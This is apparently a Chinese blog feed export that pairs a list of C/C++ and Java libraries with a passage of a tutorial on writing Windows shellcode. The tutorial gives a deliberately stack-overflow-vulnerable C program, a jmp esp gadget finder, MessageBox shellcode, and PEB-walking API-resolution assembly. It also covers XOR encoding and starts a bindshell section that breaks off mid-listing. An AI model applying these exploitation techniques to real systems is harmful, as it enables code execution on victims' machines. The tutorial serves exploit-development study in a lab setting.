<p><a href="https://github.com/lewissbaker/cppcoro">cppcoro</a> - A library of C++ coroutine abstractions for the coroutines TS.</p>
<p><a href="https://github.com/d2school/da4qi4">da4qi4</a> - a cpp Web Server .</p>
<p><a href="https://github.com/zrax/pycdc">pycdc</a> - C++ python bytecode disassembler and decompiler.</p>
<p><a href="https://github.com/zrax/string_theory">string_theory</a> - 具有类型安全格式的灵活现代 C++ 字符串库.</p>
<p><a href="https://github.com/MiroKaku/ucxxrt">ucxxrt</a> - The Universal C++ RunTime library, supporting kernel-mode C++ exception-handler and STL.</p>
<p><a href="https://github.com/MiroKaku/libwsk">libwsk</a> - The Kernel-Mode Winsock library, supporting TCP, UDP and Unix sockets .</p>
<p><a href="https://github.com/LianjiaTech/kbms">kbms</a> - 一个轻量级c++网络框架.</p>
<p><a href="https://github.com/protocolbuffers/protobuf">protobuf</a> - Protocol Buffers - Google 的数据交换格式.</p>
<p><a href="https://github.com/Raais/ImStudio">ImStudio</a> - Real-time GUI layout creator for Dear ImGui.</p>
<p><a href="https://github.com/troldal/OpenXLSX">OpenXLSX</a> - A C++ library for reading, writing, creating and modifying Microsoft Excel® (.xlsx) files.</p>
<p><a href="https://github.com/seladb/PcapPlusPlus">PcapPlusPlus</a> - PcapPlusPlus is a multiplatform C++ library for capturing, parsing and crafting of network packets.</p>
<p><a href="https://github.com/electronicarts/EAThread">EAThread</a> - EAThread implements a unified cross-platform interface for multithreaded programming.</p>
<p><a href="https://github.com/DaveGamble/cJSON">cJSON</a> - ANSI C 中的超轻量级 JSON 解析器.</p>
<p><a href="https://github.com/alexhude/MMUit">MMUit</a> - 用于探索和修改 ARM64 地址转换的轻量级工具包。</p>
<p><a href="https://github.com/greg7mdp/parallel-hashmap">parallel-hashmap</a> - 一系列仅标头、非常快速且内存友好的哈希图和 btree 容器。</p>
<p><a href="https://github.com/ArthurSonzogni/FTXUI">FTXUI</a> - 一个简单的 C++ 库，用于基于终端的用户界面。</p>
<p><a href="https://github.com/llxiaoyuan/oxorany">oxorany</a> - 带有混淆的编译时任意常量加密.</p>
<p><a href="https://github.com/ultimatepp/ultimatepp">ultimatepp</a> - U++是一个C++跨平台快速应用开发框架，专注于程序员的生产力。它包括一组库（GUI、SQL、网络等）和集成开发环境（TheIDE）。</p>
<p><a href="https://github.com/kokke/tiny-regex-c">tiny-regex-c</a> - Small portable regex in C.</p>
<p><a href="https://github.com/lpcvoid/cpp-net-lib">cpp-net-lib</a> - Modern, header-only, compact and cross platform C++ network&#x2F;sockets library.</p>
<p><a href="https://github.com/sheredom/utf8.h">utf8.h</a> - single header utf8 string functions for C and C++.</p>
<p><a href="https://github.com/dougbinks/enkiTS">enkiTS</a> - A permissively licensed C and C++ Task Scheduler for creating parallel programs. Requires C++11 support.</p>
<p><a href="https://github.com/osen/stent">stent</a> - Completely avoid dangling pointers in C.</p>
<p><a href="https://github.com/jonathandata1/tyr">tyr</a> - Android Recon &amp; Research Tools.</p>
<p><a href="https://github.com/libcpr/cpr">cpr</a> - C++ Requests: Curl for People, a spiritual port of Python Requests.</p>
<p><a href="https://github.com/fnc12/sqlite_orm">sqlite_orm</a> - SQLite ORM light header only library for modern C++.</p>
<p><a href="https://github.com/skypjack/uvw">uvw</a> - Header-only, event based, tiny and easy to use libuv wrapper in modern C++ .</p>
<p><a href="https://github.com/HoShiMin/Sig">Sig</a> - The most powerful and customizable binary pattern scanner.</p>
<p><a href="https://github.com/fmtlib/fmt">fmt</a> - <code>&#123;fmt&#125;</code> is an open-source formatting library providing a fast and safe alternative to C stdio and C++ iostreams.</p>
<p><a href="https://github.com/abseil/abseil-cpp">abseil-cpp</a> - Abseil 是一个开源的 C++ 库代码集合，旨在增强 C++ 标准库。</p>
<p><a href="https://github.com/ryanhaining/cppitertools">cppitertools</a> - 受 Python 内置函数和 itertools 库启发的基于范围的 for 循环附加组件。与 itertools 和 Python3 内置函数一样，该库尽可能使用惰性求值。</p>
<p><a href="https://github.com/partouf/Crosscables">Crosscables</a> - 用于线程、文件系统、网络、MySQL 和其他事物的跨平台 C++98 库。</p>
<p><a href="https://github.com/niekbouman/ctbignum">ctbignum</a> - Constexpr C++20 Big-Integer &#x2F; Finite-Field library</p>
<p><a href="https://github.com/Neargye/magic_enum">magic_enum</a> - 为枚举提供静态反射，无需任何宏或样板代码即可处理任何枚举类型。</p>
<p><a href="https://github.com/CLIUtils/CLI11">CLI11</a> - CLI11 is a command line parser for C++11 and beyond that provides a rich feature set with a simple and intuitive interface.</p>
<p><a href="https://github.com/rbock/sqlpp11">sqlpp11</a> - A type safe SQL template library for C++.</p>
<p><a href="https://github.com/likle/cwalk">cwalk</a> - Path library for C&#x2F;C++. Cross-Platform for Windows, MacOS and Linux. </p>
<p><a href="https://github.com/Quintus/pathie-cpp">pathie-cpp</a> - Small C++ library for crossplatform Unicode path management</p>
<p><a href="https://github.com/iUIShop/LibUIDK">LibUIDK</a> - LibUIDK原来是商业界面库，2019年9月8号开源。是专业开发Windows平台下图形用户界面的开发包，也是国内第一款商业的高级界面开发工具。</p>
<p><a href="https://github.com/josuttis/belleviews">belleviews</a> - Belleviews are easier to use, more robust, and cause less unexpected compile-time and runtime errors than the views of the C++ standard library.</p>
<p><a href="https://github.com/google/benchmark">benchmark</a> - A library to benchmark code snippets, similar to unit tests.</p>
<p><a href="https://github.com/gabime/spdlog">spdlog</a> - Very fast, header-only&#x2F;compiled, C++ logging library. ci</p>
<p><a href="https://github.com/foonathan/type_safe">type_safe</a> - type_safe provides zero overhead abstractions that use the C++ type system to prevent bugs.</p>
<p><a href="https://github.com/marzer/tomlplusplus">tomlplusplus</a> - Header-only TOML config file parser and serializer for C++17. </p>
<p><a href="https://github.com/ToruNiina/toml11">toml11</a> - toml11 is a C++11 (or later) header-only toml parser&#x2F;encoder depending only on C++ standard library.</p>
<p><a href="https://github.com/TartanLlama/expected">expected</a> - Single header implementation of std::expected with functional-style extensions.</p>
<p><a href="https://github.com/oneapi-src/oneTBB">oneTBB</a> - oneTBB is a flexible C++ library that simplifies the work of adding parallelism to complex applications, even if you are not a threading expert.</p>
<p><a href="https://github.com/taocpp/json">taoJSON</a> - taoJSON is a C++ header-only JSON library that provides a generic Value Class, uses Type Traits to interoperate with C++ types, uses an Events Interface to convert from and to JSON, JAXN, CBOR, MsgPack and UBJSON, and much more…</p>
<p><a href="https://github.com/rollbear/strong_type">strong_type</a> - An additive strong typedef library for C++14&#x2F;17&#x2F;20 using the Boost Software License 1.0</p>
<p><a href="https://github.com/jfalcou/spy">spy</a> - Detection and versioning of operating systems, compilers, architecture and other element are traditionally done using preprocessor macros. Library like Boost.Predef provides a sanitized interface on top of those but still live in a world where the preprocessor is king.</p>
<p><a href="https://github.com/ThePhD/sol2">sol2</a> - sol2 is a C++ library binding to Lua. It currently supports all Lua versions 5.1+ (LuaJIT 2.0+ and MoonJIT included). </p>
<p><a href="https://github.com/ericniebler/range-v3">range-v3</a> - Range library for C++14&#x2F;17&#x2F;20, basis for C++20’s std::ranges .</p>
<p><a href="https://github.com/zeux/pugixml">pugixml</a> - Light-weight, simple and fast XML parser for C++ with XPath support.</p>
<p><a href="https://github.com/ned14/outcome">outcome</a> - Outcome is a C++14 library for reporting and handling function failures. It can be used as a substitute for, or a complement to, the exception handling mechanism.</p>
<p><a href="https://github.com/libuv/libuv">libuv</a> - libuv is a multi-platform support library with a focus on asynchronous I&#x2F;O. It was primarily developed for use by Node.js, but it’s also used by Luvit, Julia, uvloop, and others.</p>
<p><a href="https://www.lua.org/">lua</a> - Lua is a powerful, efficient, lightweight, embeddable scripting language. It supports procedural programming, object-oriented programming, functional programming, data-driven programming, and data description. </p>
<p><a href="https://github.com/p12tic/libsimdpp">libsimdpp</a> - libsimdpp is a portable header-only zero-overhead C++ low level SIMD library. The library presents a single interface over SIMD instruction sets present in x86, ARM, PowerPC and MIPS architectures.</p>
<p><a href="https://github.com/danielaparker/jsoncons">jsoncons</a> - A C++, header-only library for constructing JSON and JSON-like data formats, with JSON Pointer, JSON Patch, JSON Schema, JSONPath, JMESPath, CSV, MessagePack, CBOR, BSON, UBJSON .</p>
<p><a href="https://github.com/google/highway">highway</a> - Performance-portable, length-agnostic SIMD with runtime dispatch .</p>
<p><a href="https://github.com/nemequ/hedley">hedley</a> - Hedley is C&#x2F;C++ a header file designed to smooth over some platform-specific annoyances. </p>
<p><a href="https://github.com/beached/daw_json_link">daw_json_link</a> - Fast, convenient JSON serialization and parsing in C++ .</p>
<p><a href="https://github.com/Hosseinmoein/DataFrame">DataFrame</a> - This is a C++ analytical library designed for data analysis similar to libraries in Python and R. For example, you could compare this to Pandas or R data.frame.</p>
<p><a href="https://github.com/HowardHinnant/date">date</a> - A date and time library based on the C++11&#x2F;14&#x2F;17 <code>&lt;chrono&gt;</code> header.</p>
<p><a href="https://github.com/hanickadot/compile-time-regular-expressions">compile-time-regular-expressions</a> - Compile Time Regular Expression in C++ .</p>
<p><a href="https://github.com/hanickadot/cthash">cthash</a> - This library is constexpr implementation of SHA-2 and SHA-3 family of hashes.</p>
<p><a href="https://github.com/partouf/Crosscables">Crosscables</a> - A cross platform C++98 library for Threading, Filesystem, Network, MySQL and other things .</p>
<p><a href="https://github.com/soasis/text">ztd.text</a> - A spicy text library for C++ that has the explicit goal of enabling the entire ecosystem to share in proper forward progress towards a bright Unicode future. </p>
<h1 id="Java-库"><a href="#Java-库" class="headerlink" title="Java 库"></a>Java 库</h1><p><a href="https://github.com/dhatim/fastexcel">fastexcel</a> - Generate and read big Excel files quickly.</p>
<p><a href="https://github.com/hzw1199/xml2axml">xml2axml</a> - encode xml to axml AND decode axml to xml–Hack Android Manifest easily.</p>
<p><a href="https://github.com/fornwall/jelf">jelf</a> - ELF parsing library in java.</p>
<h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><p><a href="https://github.com/cugu/awesome-forensics">awesome-forensics</a> - A curated list of awesome forensic analysis tools and resources.</p>
<p><a href="https://github.com/den4uk/andriller">andriller</a> - Andriller - is software utility with a collection of forensic tools for smartphones.</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>开发shellcode的艺术</title>
    <url>/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="shellcode-概述"><a href="#shellcode-概述" class="headerlink" title="shellcode 概述"></a>shellcode 概述</h1><p>shellcode 攻击中植入进程的代码。</p>
<p>exploit 漏洞利用就是代码植入的过程。</p>
<p>在 shellcode 的开发中，一般需要解决下面几个问题。</p>
<ol>
<li>让程序能够自动定位到 shellcode 的起始地址。</li>
<li>写出比较通用版的 shellcode 。</li>
<li>shellcode 编码。</li>
<li>shellcode 需要短小精悍。</li>
</ol>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>编译一段包含栈溢出漏洞的代码，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">verify_password</span><span class="params">(<span class="type">char</span>* password)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">44</span>];</span><br><span class="line">	authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">	<span class="comment">// 制造栈溢出漏洞</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, password);</span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE* fp;</span><br><span class="line">	<span class="comment">// 加载 user32.dll ，方便演示弹窗</span></span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="comment">// 使用文件方便编写 exp</span></span><br><span class="line">	<span class="keyword">if</span> (!(fp=<span class="built_in">fopen</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">	valid_flag = <span class="built_in">verify_password</span>(password);</span><br><span class="line">	<span class="keyword">if</span> (valid_flag)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实验环境：</p>
<ul>
<li>操作系统：XPSP3</li>
<li>编译器：VC++ 6.0</li>
<li>build 版本：debug 版本</li>
</ul>
<p>首先找到需要需要覆盖的内存地址，如下图所示。</p>
<img src="/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/2022-04-12-20-37-38.png" class="">

<p>然后构造对应字节大小的数据，需要 14 个 DWORD 数据才可以覆盖返回地址，这里使用 14 个 4321 写入 password.txt 中，调试可以发现正好覆盖返回地址。</p>
<h2 id="定位-shellcode"><a href="#定位-shellcode" class="headerlink" title="定位 shellcode"></a>定位 shellcode</h2><p>一般情况下，<code>ESP</code> 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，<code>ESP</code> 所指的位置恰好是我们所淹没的返回地址的下一个位置，所以我们可以将 <code>ESP</code> 作为跳板。</p>
<img src="/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/2022-04-08-17-44-21.png" class="">

<h2 id="获取跳板"><a href="#获取跳板" class="headerlink" title="获取跳板"></a>获取跳板</h2><p>由于使用 <code>jmp esp</code> 作为跳板，那么就要先找到内存中 <code>jmp esp</code> 指令的地址，该地址最好是一些万年不变的地址，并且位于几乎所有的进程都会使用的模块。</p>
<p>下面代码就是查找 <code>user32.dll</code> 模块中 <code>jmp esp</code> 的代码。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_NAME <span class="string">&quot;user32.dll&quot;</span></span></span><br><span class="line"><span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">	BYTE* ptr;</span><br><span class="line">	<span class="type">int</span> position,address;</span><br><span class="line">	HINSTANCE handle;</span><br><span class="line">	BOOL done_flag = FALSE;</span><br><span class="line"></span><br><span class="line">	handle=<span class="built_in">LoadLibrary</span>(DLL_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!handle)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; load dll erro !&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ptr = (BYTE*)handle;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//0xFFE4 is the opcode of jmp esp</span></span><br><span class="line">				<span class="type">int</span> address = (<span class="type">int</span>)ptr + position;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">catch</span>(...)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> address = (<span class="type">int</span>)ptr + position;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>, address);</span><br><span class="line">			done_flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将上述代码在 xp sp3 操作系统上使用 VC 6.0 编译运行结果如下所示，这里选用 0x77d456f7 处的 jmp esp 作为定位 shellcode 的跳板。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OPCODE found at 0x77d29353</span><br><span class="line">OPCODE found at 0x77d456f7</span><br><span class="line">......</span><br><span class="line">END OF 0x77e49000</span><br></pre></td></tr></table></figure>

<p>使用 dependency walker 获取 ExitProcess（kernel32.dll） 和 MessageBoxA（user32.dll）的内存地址分别为 0x7c81cafa 和 0x77d507ea 。</p>
<p>构造 shellcode，调试至无问题后在 x64dbg 选中 shellcode 对应的汇编代码，使用右键菜单 -&gt; 二进制 -&gt; 复制（快捷键 Shift + C），并通过 010Editor -&gt; Edit -&gt; paste from -&gt; paste from hex text (快捷键 Ctrl+Shift+V) 粘贴到二进制文本中，等待后续使用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WINDOWS.H&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	HINSTANCE libhandle;</span><br><span class="line">	<span class="type">char</span> * dllbuf = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	libhandle = <span class="built_in">LoadLibrary</span>(dllbuf);</span><br><span class="line"></span><br><span class="line">	__asm&#123;</span><br><span class="line">		sub sp, <span class="number">0x440</span></span><br><span class="line">		<span class="keyword">xor</span> ebx, ebx</span><br><span class="line">		<span class="keyword">xor</span> eax, eax	<span class="comment">// 清零</span></span><br><span class="line">		mov al, <span class="number">0x74</span>	<span class="comment">// 构造出 push 0x00000074 即 t</span></span><br><span class="line">		push eax</span><br><span class="line">		push <span class="number">0x61434B43</span>	<span class="comment">// 构造出 CKCa</span></span><br><span class="line"></span><br><span class="line">		mov eax, esp</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax, <span class="number">0x77d507ea</span>	<span class="comment">// MessageBoxA</span></span><br><span class="line">		call eax</span><br><span class="line"></span><br><span class="line">		push ebx</span><br><span class="line">		mov eax, <span class="number">0x7c81cafa</span> <span class="comment">// ExitProcess</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改 password.txt 的内容，将返回地址覆盖为 0x77d456f7, 并写入之前准备好的 shellcode ，如下图所示。</p>
<img src="/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/2022-04-12-21-57-24.png" class="">

<p>然后运行程序，将执行 shellcode, 弹出 MessageBox 并且可以正常退出。如下图所示。</p>
<img src="/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/2022-04-12-22-00-12.png" class="">

<h1 id="开发通用的-shellcode"><a href="#开发通用的-shellcode" class="headerlink" title="开发通用的 shellcode"></a>开发通用的 shellcode</h1><h2 id="通过-PEB-定位-API-地址"><a href="#通过-PEB-定位-API-地址" class="headerlink" title="通过 PEB 定位 API 地址"></a>通过 PEB 定位 API 地址</h2><ol>
<li>首先通过段选择字 <code>FS</code> 在内存中找到当前的线程环境块 <code>TEB</code> 。</li>
<li>线程环境块偏移位置为 <code>0x30</code> 的地方存放着指向进程环境块 <code>PEB</code> 的指针。</li>
<li>进程环境块中偏移位置为 <code>0x0C</code> 的地方存放着指向 <code>PEB_LDR_DATA</code> 结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li>
<li><code>PEB_LDR_DATA</code> 结构体偏移位置为 <code>0x1C</code> 的地方存放着指向模块初始化链表的头指针 <code>InInitializationOrderModuleList</code> 。</li>
<li>模块初始化链表 <code>InInitializationOrderModuleList</code> 中按顺序存放着 PE 装入运行时初始化模块的信息，第一个链表结点是 <code>ntdll.dll</code>，第二个链表结点就是 <code>kernel32.dll</code>。</li>
<li>找到属于 <code>kernel32.dll</code> 的结点后，在其基础上再偏移 <code>0x08</code> 就是 <code>kernel32.dll</code> 在内存中的加载基地址。</li>
<li>从 <code>kernel32.dll</code> 的加载基址算起，偏移 <code>0x3C</code> 的地方就是其 <code>PE</code> 头。</li>
<li><code>PE</code> 头偏移 <code>0x78</code> 的地方存放着指向函数导出表的指针。</li>
<li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。<ul>
<li>导出表偏移 <code>0x1C</code> 处的指针指向存储导出函数偏移地址（RVA）的列表。</li>
<li>导出表偏移 <code>0x20</code> 处的指针指向存储导出函数函数名的列表。</li>
<li>函数的 <code>RVA</code> 地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的 <code>RVA</code> 。</li>
<li>获得 <code>RVA</code> 后，再加上前边已经得到的动态链接库的加载基址，就获得了所需 API 此刻在内存中的虚拟地址，这个地址就是我们最终在 shellcode 中调用时需要的地址。</li>
</ul>
</li>
</ol>
<img src="/2022/04/06/%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/2022-04-13-08-29-43.png" class="">

<p>相应的汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">    CLD								// 清空 DF 标志位</span><br><span class="line">    push 0x1e380a6a					// MessageBoxA 的hash</span><br><span class="line">    push 0x4fd18963					// ExitProcess 的hash</span><br><span class="line">    push 0x0c917432					// LoadlibraryA 的hash</span><br><span class="line">    mov esi, esp					// esi 指向了 LoadlibraryA 的hash</span><br><span class="line">    lea edi, [esi - 0xC]			// edi 指向了 MessageBoxA 的hash</span><br><span class="line"></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bh, 0x04</span><br><span class="line">    sub esp, ebx					// ebx = 0x00000400</span><br><span class="line"></span><br><span class="line">    mov bx, 0x3233					// ebx = 0x00003233</span><br><span class="line">    push ebx</span><br><span class="line">    push 0x72657375					// 此时内存 75736572 33320000</span><br><span class="line">    push esp						// 保存 user32 字符串的地址</span><br><span class="line">    xor edx, edx</span><br><span class="line"></span><br><span class="line">    mov ebx, fs:[edx + 0x30]		// ebx 指向 PEB</span><br><span class="line">    mov ecx, [ebx + 0x0C]			// ecx 指向 LDR</span><br><span class="line">    mov ecx, [ecx + 0x1C]			// ecx 指向第一个结点，该结点首地址指向第二个结点</span><br><span class="line"></span><br><span class="line">    mov ecx, [ecx]					// ecx 指向第二个结点</span><br><span class="line">    mov ebp, [ecx + 0x08]			// ebp 指向 kernel32.dll 基址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_lib_functions:</span><br><span class="line"></span><br><span class="line">    lodsd							// 加载 esi 指向的内存到 eax 中， 并且 esi = esi + 4</span><br><span class="line">    cmp eax, 0x1e380a6a             // 如果查找的函数为 MessageBoxA 则调用 LoadlibraryA 加载 user32 模块</span><br><span class="line">    jne find_functions</span><br><span class="line">    xchg eax, ebp</span><br><span class="line">    call [edi - 0x8]                // 调用 LoadlibraryA</span><br><span class="line">    xchg eax, ebp                   // ebp 始终保存模块基址</span><br><span class="line"></span><br><span class="line">find_functions:</span><br><span class="line">    pushad                          // 所有通用寄存器入栈</span><br><span class="line">    mov eax, [ebp + 0x3C]			// 获取模块的 PE 头</span><br><span class="line">    mov ecx, [ebp + eax + 0x78]		// 获取导出表指针偏移</span><br><span class="line">    add ecx, ebp					// 获取导出表的实际位置</span><br><span class="line">    mov ebx, [ecx + 0x20]			// 导出函数函数名的列表偏移</span><br><span class="line">    add ebx, ebp					// 导出函数函数名的列表的实际位置</span><br><span class="line">    xor edi, edi</span><br><span class="line"></span><br><span class="line">next_function_loop:</span><br><span class="line">    inc edi</span><br><span class="line">    mov esi, [ebx + edi *4]			// 导出函数函数名相对偏移</span><br><span class="line">    add esi, ebp					// 实际位置</span><br><span class="line">    cdq</span><br><span class="line"></span><br><span class="line">hash_loop:							// hash 函数</span><br><span class="line">    movsx eax, byte ptr[esi]</span><br><span class="line">    cmp al , ah</span><br><span class="line">    jz compare_hash</span><br><span class="line">    ror edx, 7</span><br><span class="line">    add edx, eax</span><br><span class="line">    inc esi</span><br><span class="line">    jmp hash_loop</span><br><span class="line"></span><br><span class="line">compare_hash:</span><br><span class="line">    cmp edx, [esp + 0x1C]</span><br><span class="line">    jnz next_function_loop</span><br><span class="line">    mov ebx, [ecx + 0x24]           // 解析 PE</span><br><span class="line">    add ebx, ebp</span><br><span class="line">    mov di, [ebx + 2 * edi]</span><br><span class="line">    mov ebx, [ecx + 0x1c]</span><br><span class="line">    add ebx, ebp</span><br><span class="line">    add ebp, [ebx + 4 * edi]</span><br><span class="line"></span><br><span class="line">    xchg eax, ebp</span><br><span class="line">    pop edi</span><br><span class="line">    stosd</span><br><span class="line">    push edi</span><br><span class="line">    popad                           // 所有通用寄存器出栈</span><br><span class="line">    cmp eax, 0x1e380a6a             // 是否找到最后一个函数</span><br><span class="line">    jne find_lib_functions          // 查找下一个函数</span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    xor eax, eax                    // 清零</span><br><span class="line">    mov al, 0x74                    // 构造出 push 0x00000074 即 t</span><br><span class="line">    push eax</span><br><span class="line">    push 0x61434B43	                // 构造出 CKCa</span><br><span class="line"></span><br><span class="line">    mov eax, esp</span><br><span class="line">    push ebx</span><br><span class="line">    push eax</span><br><span class="line">    push eax</span><br><span class="line">    push ebx</span><br><span class="line">    call [edi - 0x04]	            // MessageBoxA</span><br><span class="line"></span><br><span class="line">    push ebx</span><br><span class="line">    call [edi - 0x08]               // ExitProcess</span><br><span class="line"></span><br><span class="line">    nop</span><br><span class="line">    nop</span><br></pre></td></tr></table></figure>

<h2 id="shellcode-编码"><a href="#shellcode-编码" class="headerlink" title="shellcode 编码"></a>shellcode 编码</h2><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>使用异或运算编码需要注意一下几点：</p>
<ul>
<li>用于异或的特定数据相当于加密算法的密钥，在选取时不可与 shellcode 已有字节相同，否则编码后会产生 NULL 字节。</li>
<li>可以选用多个密钥分别对 shellcode 的不同区域进行编码，但会增加解码操作的复杂性。</li>
<li>可以对 shellcode 进行很多轮编码运算。</li>
</ul>
<h3 id="shellcode-瘦身"><a href="#shellcode-瘦身" class="headerlink" title="shellcode 瘦身"></a>shellcode 瘦身</h3><ol>
<li>勤俭持家——精挑细选“短”指令</li>
<li>事半功倍——“复合”指令功能强</li>
<li>妙用内存——另类的 API 调用方式</li>
<li>色既是空，空既是色——代码也可以当数据</li>
<li>变废为宝——调整栈顶回收数据</li>
<li>打破常规——巧用寄存器</li>
<li>取其精华，去其糟粕——永恒的压缩法宝，hash</li>
</ol>
<h3 id="hash-算法需要考虑的因素"><a href="#hash-算法需要考虑的因素" class="headerlink" title="hash 算法需要考虑的因素"></a>hash 算法需要考虑的因素</h3><ol>
<li>所需的每个库文件（dll）内所有导出函数的函数名经过hash后的摘要不能有“碰撞”。</li>
<li>函数名经过hash后得到的摘要应该最短。</li>
<li>hash算法实现所需的代码篇幅最短。</li>
<li>经过hash后的摘要可等价于指令的机器码，即把数据也当做代码使用。</li>
</ol>
<h3 id="191-个字节的-bindshell"><a href="#191-个字节的-bindshell" class="headerlink" title="191 个字节的 bindshell"></a>191 个字节的 bindshell</h3><p>实现bindshell 需要的函数。</p>
<ol>
<li><p><code>kernel32.dll</code> 中的导出函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpFileName   <span class="comment">// file name of module</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpCommandLine,                      <span class="comment">// command line string</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  